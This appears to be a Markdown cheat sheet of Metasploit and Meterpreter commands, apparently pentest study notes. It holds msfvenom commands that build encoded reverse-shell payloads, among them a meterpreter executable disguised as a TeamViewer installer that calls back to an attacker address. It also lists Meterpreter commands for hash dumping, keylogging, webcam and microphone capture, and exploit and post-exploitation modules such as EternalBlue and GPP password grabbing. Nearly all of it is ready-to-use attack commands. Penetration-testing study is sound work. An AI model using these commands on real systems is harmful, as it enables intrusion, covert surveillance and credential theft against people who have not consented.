### Databases

| **Command**    | **Description**                                                                                 |
| ----------- | ----------------------------------------------------------------------------------------------- |
| `sudo service postgresql status` | PostgreSQL Status                                                                               |
| `sudo systemctl start postgresql`  | Start PostgreSQL.                                           |
| `sudo msfdb init`  |  Initiate a Database      |
| `sudo msfdb status`      | Initiate a Database                        |
| `sudo msfdb run`  |  Connect to the Initiated Database. |
| `msf6 > help database`   | MSF - Database Options        |
| `msf6 > workspace`      | Workspaces                                |
| `msf6 > db_export -h`      | MSF - DB Export                                |
| `msf6 > hosts -h`      | MSF - Stored Hosts                               |
| `msf6 > services -h`      | MSF - Stored Services of Hosts|
| `msf6 > db_nmap -sV -sS 10.10.10.8`      | Using Nmap Inside MSFconsole                                |
| `msf6 > creds -h`      | MSF - Stored Credentials                                |
| `msf6 > loot -h`      | The loot command works in conjunction with the command above to offer you an at-a-glance list of owned services and users.                                 |


### Start Metasploit without banner

`msfconsole -q`

`sudo apt update && sudo apt install metasploit-framework`

`msf6 exploit(windows/smb/ms17_010_psexec) > info`

`msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads`

####
There are three different types of payload modules in the Metasploit Framework: Singles, Stagers, and Stages.\
For example, windows/shell_bind_tcp is a single payload with no stage, whereas windows/shell/bind_tcp consists of a stager (bind_tcp) and a stage (shell).


#### Type

| **Type**    | **Description**                                                                                 |
| ----------- | ----------------------------------------------------------------------------------------------- |
| `Auxiliary` | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.  |
| `Encoders`  | Ensure that payloads are intact to their destination.                                           |
| `Exploits`  | Defined as modules that exploit a vulnerability that will allow for the payload delivery.       |
| `NOPs`      | (No Operation code) Keep the payload sizes consistent across exploit attempts.                  |
| `Payloads`  | Code runs remotely and calls back to the attacker machine to establish a connection (or shell). |
| `Plugins`   | Additional scripts can be integrated within an assessment with `msfconsole` and coexist.        |
| `Post`      | Wide array of modules to gather information, pivot deeper, etc.                                 |

### Meterpreter Modules / plugins / scripts / tools

`ls /usr/share/metasploit-framework/modules`

`ls /usr/share/metasploit-framework/plugins/`\
If the plugin is found here:\
`msf6 > load nessus`\
`msf6 > nessus_help`\
Install New Plugins\
` git clone https://github.com/darkoperator/Metasploit-Plugins`\
`sudo cp ./Metasploit-Plugins/pluginName.rb /usr/share/metasploit-framework/plugins/pluginName.rb`\
`msf6 > load pentest`

- nMap (pre-installed)
- NexPose (pre-installed)
- Nessus (pre-installed)
- Mimikatz (pre-installed V.1)
- Stdapi (pre-installed)
- Railgun
- Priv
- Incognito (pre-installed)
- Darkoperator's


`ls /usr/share/metasploit-framework/scripts/`

`ls /usr/share/metasploit-framework/tools/`

### Start Metasploit without banner

`search type:exploit platform:windows cve:2021 rank:excellent microsoft`

### Meterpreter Payload Types
*The table below contains the most common payloads used for Windows machines and their respective descriptions.*


| **Payload**                       | **Description**                                                        |
| --------------------------------- | ---------------------------------------------------------------------- |
| `generic/custom`                  | Generic listener, multi-use                                            |
| `generic/shell_bind_tcp`          | Generic listener, multi-use, normal shell, TCP connection binding      |
| `generic/shell_reverse_tcp`       | Generic listener, multi-use, normal shell, reverse TCP connection      |
| `windows/x64/exec`                | Executes an arbitrary command (Windows x64)                            |
| `windows/x64/loadlibrary`         | Loads an arbitrary x64 library path                                    |
| `windows/x64/messagebox`          | Spawns a dialog via MessageBox using a customizable title, text & icon |
| `windows/x64/shell_reverse_tcp`   | Normal shell, single payload, reverse TCP connection                   |
| `windows/x64/shell/reverse_tcp`   | Normal shell, stager + stage, reverse TCP connection                   |
| `windows/x64/shell/bind_ipv6_tcp` | Normal shell, stager + stage, IPv6 Bind TCP stager                     |
| `windows/x64/meterpreter/$`       | Meterpreter payload + varieties above                                  |
| `windows/x64/powershell/$`        | Interactive PowerShell sessions + varieties above                      |
| `windows/x64/vncinject/$`         | VNC Server (Reflective Injection) + varieties above                    |

### Encoders

##### Without encoding
`msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai`

`msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl`

##### With Encoding
`msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai`
 
##### Create exe app
`msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe`
 
##### MSF - VirusTotal
`msf-virustotal -k <API key> -f TeamViewerInstall.exe`

#### Windows reverse meterpreter payload

`set payload windows/meterpreter/reverse_tcp`

#### Windows VNC Meterpreter payload

`set payload windows/vncinject/reverse_tcp`

`set ViewOnly false`

#### Linux Reverse Meterpreter payload

`set payload linux/meterpreter/reverse_tcp`

#### Android Reverse Meterpreter payload

`set payload android/meterpreter/reverse_tcp`

### Meterpreter Cheat Sheet

| Command | Description |
|---------|-------------|
| `upload file c:\\windows` | Upload file to Windows target |
| `download c:\\windows\\repair\\sam /tmp` | Download file from Windows target |
| `execute -f c:\\windows\temp\exploit.exe` | Run .exe on target |
| `execute -f cmd -c` | Creates new channel with cmd shell |
| `ps` | Show processes |
| `shell` | Get shell on the target |
| `getsystem` | Attempts privilege escalation on the target |
| `hashdump` | Dump the hashes on the target |
| `portfwd add –l 3389 –p 3389 –r target` | Create port forward to target machine |
| `portfwd delete –l 3389 –p 3389 –r target` | Delete port forward |
| `screenshot` | Capture screenshot of the target machine |
| `keyscan_start` | Start keylogger |
| `keyscan_dump` | Dump collected keystrokes |
| `webcam_snap` | Take webcam snapshot |
| `record_mic` | Record microphone |
| `enum_chrome` | Enumerate Chrome browser data |
## :computer: Common Metasploit Modules

### :closed_lock_with_key: Remote Windows Metasploit Modules (exploits)

| Command | Description |
|---------|-------------|
| `use exploit/windows/smb/ms08_067_netapi` | MS08_067 Windows 2k, XP, 2003 Remote Exploit |
| `use exploit/windows/dcerpc/ms06_040_netapi` | MS08_040 Windows NT, 2k, XP, 2003 Remote Exploit |
| `use exploit/windows/smb/ms09_050_smb2_negotiate_func_index` | MS09_050 Windows Vista SP1/SP2 and Server 2008 (x86) Remote Exploit |
| `use exploit/windows/smb/ms17_010_eternalblue` | MS17_010 EternalBlue SMB Remote Windows Kernel Pool Corruption |

### :key: Local Windows Metasploit Modules (exploits)

| Command | Description |
|---------|-------------|
| `use exploit/windows/local/bypassuac` | Bypass UAC on Windows 7 + Set target + arch, x86/64 |
| `use exploit/windows/local/ms10_015_kitrap0d` | MS10_015 Kitrap0d Local Privilege Escalation |

### :mag: Auxilary Metasploit Modules

| Command | Description |
|---------|-------------|
| `use auxiliary/scanner/http/dir_scanner` | Metasploit HTTP directory scanner |
| `use auxiliary/scanner/http/jboss_vulnscan` | Metasploit JBOSS vulnerability scanner |
| `use auxiliary/scanner/mssql/mssql_login` | Metasploit MSSQL Credential Scanner |
| `use auxiliary/scanner/mysql/mysql_version` | Metasploit MySQL Version Scanner |
| `use auxiliary/scanner/oracle/oracle_login` | Metasploit Oracle Login Module |

### :shell: Metasploit Powershell Modules

| Command | Description |
|---------|-------------|
| `use exploit/multi/script/web_delivery` | Metasploit powershell payload delivery module |
| `post/windows/manage/powershell/exec_powershell` | Metasploit upload and run powershell script through a session |
| `use exploit/multi/http/jboss_maindeployer` | Metasploit JBOSS deploy |
| `use exploit/windows/mssql/mssql_payload` | Metasploit MSSQL payload |

### :wrench: Post Exploit Windows Metasploit Modules

| Command | Description |
|---------|-------------|
| `run post/windows/gather/win_privs` | Metasploit show privileges of current user |
| `use post/windows/gather/credentials/gpp` | Metasploit grab GPP saved passwords |
| `load mimikatz -> wdigest` | Metasploit load Mimikatz |
| `run post/windows/gather/local_admin_search_enum` | Identify other machines that the supplied domain user has administrative access to |
